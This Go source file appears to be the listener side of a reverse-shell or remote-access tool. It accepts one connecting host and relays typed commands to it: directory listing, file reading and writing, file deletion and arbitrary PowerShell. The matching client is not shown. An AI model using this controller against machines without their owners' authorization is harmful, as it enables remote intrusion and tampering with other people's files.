package main

import (
	"bufio"
	"bytes"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
)

var port string = ":8888"

func main() {
	config := readConfig("server.cfg")
	for _, kv := range config {
		key, value := kv[0], kv[1]
		switch key {
		case "port":
			port = value
		}
	}

	ln := startServer(port)

	conn, err := ln.Accept()
	if err != nil {
		log.Fatalf("Accept error: %v", err)
	}

	handleClient(conn)
}

func startServer(port string) (ln net.Listener) {
	ln, err := net.Listen("tcp", port)
	if err != nil {
		log.Fatalf("Listen error: %v", err)
	}

	fmt.Printf("Server started on port [%v]\n", port)
	return ln
}

func handleClient(conn net.Conn) {
	var addr string = conn.RemoteAddr().String()
	var buf []byte

	fmt.Printf("\n    #### Host connected: %v ####\n\n", addr)

	for {
		conn.Write([]byte("pwd"))

		buf = make([]byte, 1024)
		_, err := conn.Read(buf)
		if err != nil {
			log.Fatalf("Read error: %v", err)
		}
		buf = bytes.Trim(buf, "\x00")
		fmt.Printf("%s>", buf)

		scanner := bufio.NewScanner(os.Stdin)
		scanner.Scan()

		if err := scanner.Err(); err != nil {
			log.Fatalf("Scanner error: %v\n", err)
		}

		if scanner.Text() != "" {
			if scanner.Text() != "help" {
				conn.Write([]byte(scanner.Text()))

				buf = make([]byte, 1024)
				_, err = conn.Read(buf)
				if err != nil {
					log.Fatalf("Read error: %v", err)
				}
				buf = bytes.Trim(buf, "\x00")
				fmt.Printf("%s\n", buf)

			} else {
				printCmdList()
			}
		}
	}
}

func printCmdList() {
	cmdList := [][]string{
		{"help", "Displays this help screen."},
		{"pwd", "Displays the working directory."},
		{"ls", "Displays contents of the working directory."},
		{"cd", "Changes the working directory, 'cd ..' to move up."},
		{"cat", "Display contents of a file."},
		{"ps", "Runs the specified powershell command."},
		{"touch", "Creates a file with the specified filename."},
		{"write", "Writes text to the specified file."},
		{"display", "Writes text to the specified file and opens the file."},
		{"remove", "Removes the specified file."},
	}

	fmt.Print("\n")
	for _, cmd := range cmdList {
		fmt.Printf("    %-12v%v\n", cmd[0], cmd[1])
	}
	fmt.Print("\n")
}

func readConfig(name string) (config [][]string) {
	data, err := os.ReadFile(name)
	if err != nil {
		log.Fatalf("read error: %v\n", err)
	}

	lines := strings.Split(strings.ReplaceAll(string(data), "\r", ""), "\n")

	for _, line := range lines {
		keyValuePair := strings.Split(line, "=")
		if len(keyValuePair) == 2 {
			config = append(config, keyValuePair)
		}
	}

	return config
}
